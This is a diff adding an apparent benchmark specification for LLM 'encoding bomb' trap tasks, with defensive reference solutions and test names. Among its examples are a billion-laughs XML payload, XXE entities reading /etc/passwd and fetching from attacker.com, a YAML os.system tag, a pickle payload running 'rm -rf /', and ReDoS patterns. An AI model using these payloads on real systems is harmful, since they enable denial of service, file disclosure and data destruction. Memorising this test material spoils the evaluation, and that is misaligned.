@@ -1,0 +1,1496 @@
+id: "trap-data-encoding-bomb-001"
+version: "1.0.0"
+category: "traps"
+subcategory: "data-corruption"
+
+# === LLM GENERATION FRAMEWORK ===
+generation_framework:
+  multi_conversation_workflow:
+    phase_1_research: "Research LLM blind spots around data expansion and resource limits"
+    phase_2_creation: "Create task that exploits LLM assumptions about data processing"
+    phase_3_amplification: "Add multiple layers of deception with nested expansion attacks"
+    phase_4_verification: "Validate task successfully traps most LLMs through resource exhaustion"
+  
+  llm_trap_design:
+    common_llm_weaknesses:
+      - "Pattern matching without understanding compression ratios"
+      - "Assuming file size indicates processing requirements"
+      - "Missing entity expansion limits in XML processing"
+      - "Over-reliance on training data for safe parsing patterns"
+      - "Difficulty reasoning about exponential growth"
+      - "Inability to predict recursion depth issues"
+      - "Confusion between different expansion attack vectors"
+      - "Failure to consider regex backtracking complexity"
+
+# === ENCODING BOMB TRAP TAXONOMY ===
+trap_taxonomy:
+  category: "data-corruption"
+  trap_type: "encoding-bomb"
+  description: "Data that appears small but expands to enormous size or causes resource exhaustion"
+  
+  trap_families:
+    - family: "compression_bombs"
+      description: "Compressed data with extreme expansion ratios"
+      difficulty_range: [5, 9]
+      
+    - family: "xml_bombs"
+      description: "XML with entity expansion attacks"
+      difficulty_range: [5, 9]
+      
+    - family: "json_bombs"
+      description: "JSON with deep nesting or large arrays"
+      difficulty_range: [4, 8]
+      
+    - family: "yaml_bombs"
+      description: "YAML with alias/anchor expansion"
+      difficulty_range: [5, 9]
+      
+    - family: "regex_bombs"
+      description: "Input causing catastrophic regex backtracking"
+      difficulty_range: [6, 10]
+      
+    - family: "serialization_bombs"
+      description: "Serialized objects causing resource exhaustion"
+      difficulty_range: [6, 10]
+      
+    - family: "image_bombs"
+      description: "Images with extreme dimension/pixel bombs"
+      difficulty_range: [5, 8]
+      
+    - family: "recursion_bombs"
+      description: "Data causing unbounded recursion"
+      difficulty_range: [5, 9]
+
+# === LLM WEAKNESS EXPLOITATION TECHNIQUES ===
+llm_weakness_exploitation:
+  encoding_bomb_techniques:
+    # Compression Bombs (30+ techniques)
+    compression_bombs:
+      - technique: "zip_bomb_nested"
+        description: "Nested zip files with extreme ratio"
+        llm_failure_mode: "LLM extracts without size checks"
+        implementation: |
+          # 42.zip - 42KB expands to 4.5 petabytes
+          # 5 layers of nested zips
+          def naive_extract(zip_path):
+              with zipfile.ZipFile(zip_path) as zf:
+                  zf.extractall()  # BOMB: recursive expansion
+        expansion_ratio: "1:100000000000"
+        difficulty: 7
+        
+      - technique: "zip_bomb_single"
+        description: "Single layer zip with repeated content"
+        llm_failure_mode: "LLM trusts file_size header"
+        implementation: |
+          # 10KB file expands to 10GB
+          # Uses deflate's copy of repeated bytes
+          def extract_single(zip_path):
+              with zipfile.ZipFile(zip_path) as zf:
+                  for member in zf.filelist:
+                      # Header says 10GB, but file is 10KB
+                      zf.extract(member)
+        expansion_ratio: "1:1000000"
+        difficulty: 6
+        
+      - technique: "zip_quine"
+        description: "Zip file that contains itself recursively"
+        llm_failure_mode: "LLM doesn't detect recursive structure"
+        implementation: |
+          # Each zip contains a copy of itself
+          def process_zip_contents(zip_path, depth=0):
+              with zipfile.ZipFile(zip_path) as zf:
+                  for name in zf.namelist():
+                      if name.endswith('.zip'):
+                          # BOMB: infinite recursion
+                          process_zip_contents(zf.open(name), depth+1)
+        expansion_ratio: "infinite"
+        difficulty: 7
+        
+      - technique: "gzip_bomb"
+        description: "Gzip with extreme compression ratio"
+        llm_failure_mode: "LLM uses gunzip without limit"
+        implementation: |
+          # 10MB gzip expands to 10GB
+          # Zeros compress extremely well
+          def decompress(gzip_path):
+              with gzip.open(gzip_path, 'rb') as f:
+                  return f.read()  # BOMB: 10GB in memory
+        expansion_ratio: "1:1000"
+        difficulty: 5
+        
+      - technique: "bzip2_bomb"
+        description: "Bzip2 with maximum compression ratio"
+        llm_failure_mode: "LLM processes without size check"
+        implementation: |
+          # bzip2 achieves higher ratios than gzip
+          def process_bz2(path):
+              with bz2.open(path, 'rb') as f:
+                  return f.read()  # BOMB
+        expansion_ratio: "1:2000"
+        difficulty: 5
+        
+      - technique: "xz_bomb"
+        description: "XZ/LZMA with extreme ratio"
+        llm_failure_mode: "LLM trusts modern compression"
+        implementation: |
+          # XZ achieves even better ratios
+          def decompress_xz(path):
+              with lzma.open(path, 'rb') as f:
+                  return f.read()  # BOMB
+        expansion_ratio: "1:3000"
+        difficulty: 5
+        
+      - technique: "tar_bomb"
+        description: "Tar archive extracting to current directory with many files"
+        llm_failure_mode: "LLM extracts without checking paths"
+        implementation: |
+          # Tar with 10 million small files
+          def extract_tar(tar_path):
+              with tarfile.open(tar_path) as tf:
+                  tf.extractall()  # BOMB: filesystem exhaustion
+        expansion_ratio: "varies"
+        difficulty: 6
+        
+      - technique: "overlapping_zip_entries"
+        description: "Zip with entries pointing to same data"
+        llm_failure_mode: "LLM doesn't detect overlapping entries"
+        implementation: |
+          # Multiple entries reference same compressed data
+          # Extract appears to give different files but same compressed bytes
+          def extract_all(zip_path):
+              total_size = sum(f.file_size for f in zipfile.ZipFile(zip_path).filelist)
+              # BOMB: total_size >> compressed size
+        expansion_ratio: "1:N*file_count"
+        difficulty: 8
+        
+      - technique: "split_archive_bomb"
+        description: "Multi-part archive with hidden expansion"
+        llm_failure_mode: "LLM processes parts independently"
+        implementation: |
+          # part1.zip + part2.zip combined have huge expansion
+          def merge_and_extract(parts):
+              merged = b''.join(open(p, 'rb').read() for p in parts)
+              # BOMB: merged archive is bomb
+        expansion_ratio: "varies"
+        difficulty: 7
+        
+      - technique: "recursive_compression"
+        description: "File compressed multiple times"
+        llm_failure_mode: "LLM decompresses once"
+        implementation: |
+          # gzip(gzip(gzip(data)))
+          def decompress_once(path):
+              with gzip.open(path, 'rb') as f:
+                  return f.read()  # Still compressed!
+        expansion_ratio: "varies"
+        difficulty: 5
+
+    # XML Bombs (25+ techniques)
+    xml_bombs:
+      - technique: "billion_laughs"
+        description: "Exponential entity expansion attack"
+        llm_failure_mode: "LLM enables DTD processing"
+        implementation: |
+          # Classic billion laughs
+          xml = '''<?xml version="1.0"?>
+          <!DOCTYPE lolz [
+            <!ENTITY lol "lol">
+            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+            <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+            <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+            <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+            <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+            <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+            <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+          ]>
+          <lolz>&lol9;</lolz>'''
+          # 1KB expands to 3GB
+        expansion_ratio: "1:3000000"
+        difficulty: 6
+        
+      - technique: "quadratic_blowup"
+        description: "Entity expansion with quadratic complexity"
+        llm_failure_mode: "LLM allows entity definitions"
+        implementation: |
+          # Each entity references all previous
+          xml = '''<!DOCTYPE q [
+            <!ENTITY a "aaaaaaaaaa">
+            <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+            <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+          ]><q>&c;</q>'''
+        expansion_ratio: "O(n^2)"
+        difficulty: 5
+        
+      - technique: "external_entity_file"
+        description: "External entity references local file"
+        llm_failure_mode: "LLM allows external entities"
+        implementation: |
+          xml = '''<?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+          <foo>&xxe;</foo>'''
+        expansion_ratio: "varies"
+        difficulty: 6
+        
+      - technique: "external_entity_url"
+        description: "External entity fetches from URL"
+        llm_failure_mode: "LLM allows URL entities"
+        implementation: |
+          xml = '''<!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "http://attacker.com/huge.txt">
+          ]><foo>&xxe;</foo>'''
+        expansion_ratio: "varies"
+        difficulty: 6
+        
+      - technique: "parameter_entity_bomb"
+        description: "Parameter entity expansion attack"
+        llm_failure_mode: "LLM processes parameter entities"
+        implementation: |
+          # Parameter entities expand in DTD
+          xml = '''<!DOCTYPE bomb [
+            <!ENTITY % pe1 "aaaa">
+            <!ENTITY % pe2 "%pe1;%pe1;%pe1;%pe1;">
+            <!ENTITY % pe3 "%pe2;%pe2;%pe2;%pe2;">
+          ]><bomb></bomb>'''
+        expansion_ratio: "exponential"
+        difficulty: 7
+        
+      - technique: "attribute_blowup"
+        description: "Entity expansion in attributes"
+        llm_failure_mode: "LLM expands entities in attributes"
+        implementation: |
+          xml = '''<!DOCTYPE doc [
+            <!ENTITY big "aaa...1000 chars...aaa">
+          ]>
+          <doc attr="&big;&big;&big;&big;"/>'''
+        expansion_ratio: "varies"
+        difficulty: 5
+        
+      - technique: "namespace_bomb"
+        description: "Excessive namespace declarations"
+        llm_failure_mode: "LLM processes all namespaces"
+        implementation: |
+          # 100000 namespace declarations
+          xml = '<doc xmlns:ns1="..." xmlns:ns2="..." ...>'
+        expansion_ratio: "O(n)"
+        difficulty: 5
+        
+      - technique: "dtd_recursion"
+        description: "Recursive DTD inclusion"
+        llm_failure_mode: "LLM follows DTD includes"
+        implementation: |
+          # a.dtd includes b.dtd includes a.dtd
+          xml = '<!DOCTYPE doc SYSTEM "a.dtd"><doc/>'
+        expansion_ratio: "infinite"
+        difficulty: 7
+        
+      - technique: "pi_bomb"
+        description: "Processing instruction bomb"
+        llm_failure_mode: "LLM processes all PIs"
+        implementation: |
+          # Millions of processing instructions
+          xml = '<?xml?><?pi?><?pi?>...<doc/>'
+        expansion_ratio: "O(n)"
+        difficulty: 5
+
+    # JSON Bombs (20+ techniques)
+    json_bombs:
+      - technique: "deep_nesting"
+        description: "JSON nested 100000+ levels deep"
+        llm_failure_mode: "LLM uses recursive parser"
+        implementation: |
+          # [[[[[...]]]]] 100000 levels
+          json_str = '[' * 100000 + ']' * 100000
+          json.loads(json_str)  # BOMB: stack overflow
+        expansion_ratio: "O(1) space, O(n) stack"
+        difficulty: 5
+        
+      - technique: "large_array"
+        description: "Array with billions of elements"
+        llm_failure_mode: "LLM loads array into memory"
+        implementation: |
+          # [0,0,0,...] 10 billion elements
+          json_str = '[' + ','.join(['0'] * 10000000000) + ']'
+        expansion_ratio: "O(n)"
+        difficulty: 4
+        
+      - technique: "large_string"
+        description: "Single string with billions of characters"
+        llm_failure_mode: "LLM allocates full string"
+        implementation: |
+          json_str = '"' + 'a' * 10000000000 + '"'
+        expansion_ratio: "O(n)"
+        difficulty: 4
+        
+      - technique: "many_keys"
+        description: "Object with millions of keys"
+        llm_failure_mode: "LLM builds full dict"
+        implementation: |
+          # {"key1": 1, "key2": 2, ...} millions
+          json_str = '{' + ','.join(f'"{i}":0' for i in range(10000000)) + '}'
+        expansion_ratio: "O(n)"
+        difficulty: 5
+        
+      - technique: "hash_collision_keys"
+        description: "Keys designed to cause hash collisions"
+        llm_failure_mode: "LLM dict uses hash table"
+        implementation: |
+          # Keys that hash to same bucket
+          # Turns O(1) lookup into O(n)
+          json_str = '{' + ','.join(f'"{collision_key(i)}":0' for i in range(100000)) + '}'
+        expansion_ratio: "O(n^2) time"
+        difficulty: 8
+        
+      - technique: "duplicate_keys"
+        description: "Same key repeated many times"
+        llm_failure_mode: "LLM may process all duplicates"
+        implementation: |
+          # {"key": 1, "key": 2, "key": 3, ...}
+          json_str = '{' + ','.join('"key":0' for _ in range(1000000)) + '}'
+        expansion_ratio: "varies by parser"
+        difficulty: 5
+        
+      - technique: "unicode_escapes"
+        description: "JSON with many unicode escape sequences"
+        llm_failure_mode: "LLM expands all escapes"
+        implementation: |
+          # "\\u0041\\u0041\\u0041..." expands to "AAA..."
+          json_str = '"' + '\\u0041' * 1000000 + '"'
+        expansion_ratio: "6:1"
+        difficulty: 5
+        
+      - technique: "number_precision_bomb"
+        description: "Numbers requiring arbitrary precision"
+        llm_failure_mode: "LLM uses BigDecimal"
+        implementation: |
+          # Number with millions of digits
+          json_str = '{"n": ' + '1' * 1000000 + '}'
+        expansion_ratio: "O(n)"
+        difficulty: 6
+
+    # YAML Bombs (20+ techniques)
+    yaml_bombs:
+      - technique: "alias_expansion"
+        description: "YAML aliases create exponential expansion"
+        llm_failure_mode: "LLM expands all aliases"
+        implementation: |
+          yaml = '''
+          a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+          b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+          c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+          d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+          e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+          f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+          g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+          h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+          i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+          '''
+        expansion_ratio: "9^9 = 387 million"
+        difficulty: 6
+        
+      - technique: "merge_key_bomb"
+        description: "Merge key (<<) expansion attack"
+        llm_failure_mode: "LLM processes merge keys"
+        implementation: |
+          yaml = '''
+          base: &base {a: 1, b: 2, c: 3, d: 4, e: 5}
+          derived:
+            <<: *base
+            <<: *base
+            <<: *base
+            # ... thousands of merges
+          '''
+        expansion_ratio: "O(n)"
+        difficulty: 6
+        
+      - technique: "recursive_anchors"
+        description: "Anchors that reference forward"
+        llm_failure_mode: "LLM resolves circular references"
+        implementation: |
+          # Some YAML parsers don't detect cycles
+          yaml = '''
+          a: &a
+            b: *a  # Circular!
+          '''
+        expansion_ratio: "infinite"
+        difficulty: 7
+        
+      - technique: "python_code_execution"
+        description: "YAML with !!python/object tag"
+        llm_failure_mode: "LLM uses yaml.load() not yaml.safe_load()"
+        implementation: |
+          yaml = '''
+          !!python/object/apply:os.system
+          args: ['cat /etc/passwd']
+          '''
+        expansion_ratio: "code execution"
+        difficulty: 8
+        
+      - technique: "multiline_string_bomb"
+        description: "YAML with huge multiline strings"
+        llm_failure_mode: "LLM loads full string"
+        implementation: |
+          yaml = '''
+          data: |
+            ''' + 'a' * 10000000000
+        expansion_ratio: "O(n)"
+        difficulty: 4
+
+    # Regex Bombs (25+ techniques)
+    regex_bombs:
+      - technique: "catastrophic_backtracking_plus"
+        description: "(a+)+ pattern causes exponential backtracking"
+        llm_failure_mode: "LLM doesn't analyze regex complexity"
+        implementation: |
+          pattern = r'(a+)+'
+          text = 'a' * 30 + 'b'  # Takes 2^30 steps
+          re.match(pattern, text)  # BOMB: hangs
+        expansion_ratio: "O(2^n)"
+        difficulty: 6
+        
+      - technique: "nested_quantifiers"
+        description: "Nested quantifiers multiply backtracking"
+        llm_failure_mode: "LLM trusts user-provided regex"
+        implementation: |
+          pattern = r'(a*)*b'
+          text = 'a' * 25
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(2^n)"
+        difficulty: 6
+        
+      - technique: "alternation_explosion"
+        description: "Alternation with many similar options"
+        llm_failure_mode: "LLM doesn't see regex as dangerous"
+        implementation: |
+          pattern = r'(a|a)+b'
+          text = 'a' * 25
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(2^n)"
+        difficulty: 6
+        
+      - technique: "greedy_lazy_trap"
+        description: "Greedy vs lazy quantifier confusion"
+        llm_failure_mode: "LLM uses wrong quantifier type"
+        implementation: |
+          pattern = r'.*?.*?.*?b'
+          text = 'a' * 100
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(n^k)"
+        difficulty: 7
+        
+      - technique: "overlapping_patterns"
+        description: "Patterns that can match same text"
+        llm_failure_mode: "LLM doesn't see overlap"
+        implementation: |
+          pattern = r'(a+|a+a)+b'
+          text = 'a' * 20
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(2^n)"
+        difficulty: 7
+        
+      - technique: "word_boundary_trap"
+        description: "Word boundaries causing backtracking"
+        llm_failure_mode: "LLM trusts \\b as efficient"
+        implementation: |
+          pattern = r'\b(\w+\s*)+\b'
+          text = 'a ' * 100 + '!'
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(2^n)"
+        difficulty: 7
+        
+      - technique: "lookahead_bomb"
+        description: "Lookaheads with backtracking"
+        llm_failure_mode: "LLM sees lookahead as zero-width"
+        implementation: |
+          pattern = r'(?=(a+))\1b'
+          text = 'a' * 30
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(n^2)"
+        difficulty: 8
+        
+      - technique: "character_class_bomb"
+        description: "Large character class interactions"
+        llm_failure_mode: "LLM trusts character classes"
+        implementation: |
+          pattern = r'[a-z]+[a-z]+[a-z]+$'
+          text = 'a' * 100 + '1'
+          re.match(pattern, text)  # BOMB
+        expansion_ratio: "O(n^3)"
+        difficulty: 6
+
+    # Serialization Bombs (20+ techniques)
+    serialization_bombs:
+      - technique: "pickle_bomb"
+        description: "Pickle with huge object graph"
+        llm_failure_mode: "LLM unpickles untrusted data"
+        implementation: |
+          # Object with circular reference and huge expansion
+          import pickle
+          pickle.loads(bomb_data)  # BOMB: memory exhaustion
+        expansion_ratio: "varies"
+        difficulty: 7
+        
+      - technique: "pickle_code_exec"
+        description: "Pickle that executes code on load"
+        llm_failure_mode: "LLM uses pickle.load"
+        implementation: |
+          class Evil:
+              def __reduce__(self):
+                  return (os.system, ('rm -rf /',))
+          pickle.dumps(Evil())
+        expansion_ratio: "code execution"
+        difficulty: 7
+        
+      - technique: "msgpack_bomb"
+        description: "MsgPack with deep nesting"
+        llm_failure_mode: "LLM trusts binary format"
+        implementation: |
+          # Deeply nested array in msgpack
+          import msgpack
+          msgpack.unpackb(bomb_data)  # BOMB
+        expansion_ratio: "stack overflow"
+        difficulty: 6
+        
+      - technique: "protobuf_bomb"
+        description: "Protocol buffer with huge repeated field"
+        llm_failure_mode: "LLM trusts protobuf"
+        implementation: |
+          # Message with 10 billion repeated ints
+          message.ParseFromString(bomb_data)  # BOMB
+        expansion_ratio: "O(n)"
+        difficulty: 6
+        
+      - technique: "java_serialization_bomb"
+        description: "Java object stream bomb"
+        llm_failure_mode: "LLM deserializes Java objects"
+        implementation: |
+          // HashSet with hash collision objects
+          ObjectInputStream.readObject(bomb_data);  // BOMB: CPU
+        expansion_ratio: "O(n^2) time"
+        difficulty: 8
+
+    # Image Bombs (15+ techniques)
+    image_bombs:
+      - technique: "pixel_bomb"
+        description: "Small file, huge dimensions"
+        llm_failure_mode: "LLM checks file size, not dimensions"
+        implementation: |
+          # 1KB PNG claims 100000x100000 pixels
+          # Requires 10TB to render
+          from PIL import Image
+          img = Image.open(bomb_path)  # BOMB on decode
+        expansion_ratio: "1:10000000000"
+        difficulty: 6
+        
+      - technique: "decompression_bomb"
+        description: "Compressed image data expands hugely"
+        llm_failure_mode: "LLM trusts image format"
+        implementation: |
+          # PNG with repeated pattern compresses well
+          # Solid color 40000x40000 = 4.8GB in memory
+        expansion_ratio: "1:1000000"
+        difficulty: 6
+        
+      - technique: "animated_gif_bomb"
+        description: "GIF with millions of frames"
+        llm_failure_mode: "LLM loads all frames"
+        implementation: |
+          # 1000 frames of 1000x1000 = 3GB in memory
+          from PIL import Image
+          img = Image.open(gif_path)
+          frames = [frame.copy() for frame in ImageSequence.Iterator(img)]
+        expansion_ratio: "O(frames * pixels)"
+        difficulty: 6
+        
+      - technique: "svg_bomb"
+        description: "SVG with recursive references"
+        llm_failure_mode: "LLM renders SVG"
+        implementation: |
+          # SVG with <use> elements referencing each other
+          svg = '''<svg><defs><g id="a"><use href="#b"/></g>
+                   <g id="b"><use href="#a"/></g></defs>
+                   <use href="#a"/></svg>'''
+        expansion_ratio: "infinite"
+        difficulty: 7
+        
+      - technique: "jpeg_size_lie"
+        description: "JPEG with wrong size in header"
+        llm_failure_mode: "LLM trusts JPEG header"
+        implementation: |
+          # JPEG header says 100x100 but data is 10000x10000
+        expansion_ratio: "10000:1"
+        difficulty: 6
+
+    # Recursion Bombs (15+ techniques)
+    recursion_bombs:
+      - technique: "recursive_include"
+        description: "File includes itself"
+        llm_failure_mode: "LLM doesn't track include depth"
+        implementation: |
+          # a.conf: include b.conf
+          # b.conf: include a.conf
+          def process_config(path, seen=None):
+              if seen is None: seen = set()
+              if path in seen:
+                  return  # But LLM forgets this!
+        expansion_ratio: "infinite"
+        difficulty: 5
+        
+      - technique: "recursive_template"
+        description: "Template references itself"
+        llm_failure_mode: "LLM expands templates recursively"
+        implementation: |
+          template = "Hello {{ include 'self.tpl' }}"
+        expansion_ratio: "infinite"
+        difficulty: 6
+        
+      - technique: "symlink_cycle"
+        description: "Symlink cycle in data"
+        llm_failure_mode: "LLM follows symlinks"
+        implementation: |
+          # a -> b, b -> a
+          def walk(path):
+              for f in os.listdir(path):
+                  walk(os.path.join(path, f))  # BOMB: infinite
+        expansion_ratio: "infinite"
+        difficulty: 5
+        
+      - technique: "graph_traversal_bomb"
+        description: "Graph with exponential paths"
+        llm_failure_mode: "LLM doesn't detect visited nodes"
+        implementation: |
+          # Binary graph with 30 levels = 2^30 paths
+          def visit_all_paths(node, path=[]):
+              for child in node.children:
+                  visit_all_paths(child, path + [node])
+        expansion_ratio: "O(2^n)"
+        difficulty: 7
+
+# === TRAP MECHANISMS ===
+trap_mechanisms:
+  resource_exhaustion_vectors:
+    - mechanism: "memory_exhaustion"
+      description: "Consume all available memory"
+      triggers:
+        - "Load large decompressed data"
+        - "Expand all entities"
+        - "Build huge data structures"
+        - "Cache all intermediate results"
+      detection_difficulty: 5
+      
+    - mechanism: "cpu_exhaustion"
+      description: "Consume all CPU time"
+      triggers:
+        - "Exponential backtracking"
+        - "Hash collision attacks"
+        - "Quadratic algorithms on large input"
+        - "Infinite loops"
+      detection_difficulty: 6
+      
+    - mechanism: "stack_exhaustion"
+      description: "Overflow the call stack"
+      triggers:
+        - "Deep recursion"
+        - "Nested data structures"
+        - "Recursive parsing"
+      detection_difficulty: 5
+      
+    - mechanism: "disk_exhaustion"
+      description: "Fill up disk space"
+      triggers:
+        - "Extract huge archives"
+        - "Generate large temp files"
+        - "Log file explosion"
+      detection_difficulty: 5
+      
+    - mechanism: "file_descriptor_exhaustion"
+      description: "Exhaust available file descriptors"
+      triggers:
+        - "Open many files"
+        - "Leak file handles"
+        - "Recursive archive extraction"
+      detection_difficulty: 6
+      
+    - mechanism: "network_exhaustion"
+      description: "Exhaust network resources"
+      triggers:
+        - "External entity fetches"
+        - "Recursive URL fetches"
+        - "Connection pool exhaustion"
+      detection_difficulty: 6
+
+# === ANTI-DETECTION TECHNIQUES ===
+anti_detection_techniques:
+  camouflage_methods:
+    - method: "legitimate_looking_file"
+      description: "Bomb disguised as normal file"
+      techniques:
+        - "Valid file header"
+        - "Normal-looking content at start"
+        - "Explosion only in specific section"
+        - "Trigger requires multiple reads"
+      
+    - method: "delayed_explosion"
+      description: "Bomb only triggers under conditions"
+      techniques:
+        - "Explosion requires specific parser options"
+        - "Only explodes on full parse"
+        - "Conditional on system resources"
+        
+    - method: "partial_validity"
+      description: "File partially parses correctly"
+      techniques:
+        - "First 90% parses fine"
+        - "Bomb in optional section"
+        - "Explosion in rarely-used feature"
+
+# === LLM-SPECIFIC TRAPS ===
+llm_specific_traps:
+  assumption_exploitation:
+    - trap: "file_size_trust"
+      description: "LLM uses file size as processing estimate"
+      examples:
+        - name: "small_file_safe"
+          code: |
+            def process_upload(file):
+                if os.path.getsize(file) < 10 * 1024:  # 10KB
+                    # "Small file is safe"
+                    return decompress(file)  # BOMB!
+          llm_failure: "LLM sees size check as protection"
+          
+    - trap: "standard_library_safe"
+      description: "LLM trusts standard library"
+      examples:
+        - name: "json_safe"
+          code: |
+            def parse_config(data):
+                # JSON is just data, right?
+                return json.loads(data)  # BOMB: deep nesting
+          llm_failure: "LLM sees json.loads as safe"
+          
+    - trap: "format_validation_sufficient"
+      description: "LLM thinks format validation prevents bombs"
+      examples:
+        - name: "validate_then_parse"
+          code: |
+            def safe_xml(content):
+                if content.startswith('<?xml'):
+                    return xml.parse(content)  # BOMB!
+          llm_failure: "LLM sees validation as sufficient"
+
+# === DIFFICULTY MULTIPLIERS ===
+difficulty_multipliers:
+  complexity_factors:
+    - factor: "multiple_bomb_types"
+      multiplier: 1.7
+      description: "File contains multiple bomb types"
+      
+    - factor: "staged_explosion"
+      multiplier: 1.5
+      description: "Bomb triggers in stages"
+      
+    - factor: "format_nested"
+      multiplier: 1.6
+      description: "Bomb format nested in another format"
+      
+    - factor: "polyglot_bomb"
+      multiplier: 1.8
+      description: "File valid as multiple formats, bomb in one"
+
+# === COMPREHENSIVE TASK TEMPLATES ===
+task_templates:
+  - id: "safe_decompression"
+    name: "Safe Archive Decompression"
+    description: "Safely extract a potentially malicious archive"
+    difficulty: [6, 9]
+    template: |
+      A {{ archive_type }} file needs to be extracted.
+      The file is from {{ source }} and may contain decompression bombs.
+      
+      File Information:
+      - Compressed size: {{ compressed_size }}
+      - Claimed content: {{ content_description }}
+      - Source trust level: {{ trust_level }}
+      
+      Your tasks:
+      1. Analyze archive structure without full extraction
+      2. Calculate maximum expansion ratio
+      3. Implement safe extraction with limits
+      4. Detect nested archives
+      5. Verify extracted content
+      
+  - id: "safe_xml_parsing"
+    name: "Safe XML Parsing"
+    description: "Parse potentially malicious XML"
+    difficulty: [5, 8]
+    template: |
+      An XML document needs to be parsed.
+      The document may contain entity expansion attacks.
+      
+      Document Information:
+      - Size: {{ size }} bytes
+      - Source: {{ source }}
+      - Contains DTD: {{ has_dtd }}
+      
+      Your tasks:
+      1. Check for DTD and entity definitions
+      2. Configure parser to prevent expansion attacks
+      3. Set appropriate limits
+      4. Parse safely
+      5. Validate output size
+      
+  - id: "regex_audit"
+    name: "Regex Safety Audit"
+    description: "Audit regex patterns for ReDoS vulnerabilities"
+    difficulty: [6, 10]
+    template: |
+      A codebase uses regular expressions from {{ source }}.
+      Some patterns may be vulnerable to ReDoS attacks.
+      
+      Patterns to audit:
+      {{ patterns }}
+      
+      Your tasks:
+      1. Identify catastrophic backtracking patterns
+      2. Calculate worst-case complexity
+      3. Propose safe alternatives
+      4. Test with adversarial input
+      5. Implement timeout protections
+
+# === GENERATION CONFIGURATION ===
+generation_config:
+  min_variants_per_template: 100
+  total_combinations_target: 10000
+  
+  randomization_rules:
+    - rule: "bomb_type_combination"
+      description: "Combine multiple bomb types"
+    - rule: "expansion_ratio"
+      description: "Vary expansion ratios"
+    - rule: "trigger_condition"
+      description: "Vary bomb trigger conditions"
+
+# === REFERENCE SOLUTION PATTERNS ===
+reference_solutions:
+  safe_decompression: |
+    import zipfile
+    import os
+    
+    MAX_SIZE = 100 * 1024 * 1024  # 100MB
+    MAX_RATIO = 100
+    MAX_FILES = 1000
+    
+    def safe_extract(zip_path, dest_dir):
+        """Safely extract zip with bomb detection."""
+        with zipfile.ZipFile(zip_path) as zf:
+            compressed = os.path.getsize(zip_path)
+            uncompressed = sum(f.file_size for f in zf.filelist)
+            
+            # Check expansion ratio
+            if compressed > 0 and uncompressed / compressed > MAX_RATIO:
+                raise ValueError("Zip bomb detected: high ratio")
+            
+            # Check total size
+            if uncompressed > MAX_SIZE:
+                raise ValueError("Zip bomb detected: too large")
+            
+            # Check file count
+            if len(zf.filelist) > MAX_FILES:
+                raise ValueError("Zip bomb detected: too many files")
+            
+            # Check for nested zips
+            for f in zf.filelist:
+                if f.filename.endswith('.zip'):
+                    raise ValueError("Nested zip detected")
+            
+            # Safe to extract
+            zf.extractall(dest_dir)
+  
+  safe_xml_parse: |
+    from defusedxml import ElementTree
+    
+    def safe_parse_xml(content):
+        """Parse XML safely using defusedxml."""
+        return ElementTree.fromstring(content)
+  
+  safe_json_parse: |
+    import json
+    import sys
+    
+    MAX_DEPTH = 100
+    
+    def safe_parse_json(content):
+        """Parse JSON with depth limit."""
+        depth = 0
+        for char in content:
+            if char in '[{':
+                depth += 1
+                if depth > MAX_DEPTH:
+                    raise ValueError("JSON too deep")
+            elif char in ']}':
+                depth -= 1
+        return json.loads(content)
+
+# === ANTI-HARDCODING CONFIGURATION ===
+anti_hardcoding:
+  canary_tokens: true
+  randomize_paths: true
+  dynamic_content: true
+  
+  bomb_variations:
+    - vary: "expansion_ratio"
+    - vary: "bomb_type"
+    - vary: "trigger_method"
+    - vary: "camouflage_technique"
+
+# === TEST CASE GENERATION ===
+test_case_generation:
+  fail_to_pass:
+    - "test_zip_bomb_detected"
+    - "test_xml_billion_laughs_blocked"
+    - "test_deep_json_rejected"
+    - "test_regex_timeout_enforced"
+    - "test_yaml_alias_limit"
+
+  pass_to_pass:
+    - "test_normal_zip_extracts"
+    - "test_valid_xml_parses"
+    - "test_normal_json_parses"
+    - "test_safe_regex_works"
+
+# === ADDITIONAL BOMB TECHNIQUES ===
+additional_bomb_techniques:
+  # Algorithmic Complexity Bombs (20+ techniques)
+  complexity_bombs:
+    - technique: "hash_collision_bomb"
+      description: "Input causes hash table to degrade to O(n)"
+      llm_failure_mode: "LLM trusts dict as O(1)"
+      implementation: |
+        # Keys designed to all hash to same bucket
+        data = {collision_key(i): i for i in range(100000)}
+        # Lookup becomes O(n) not O(1)!
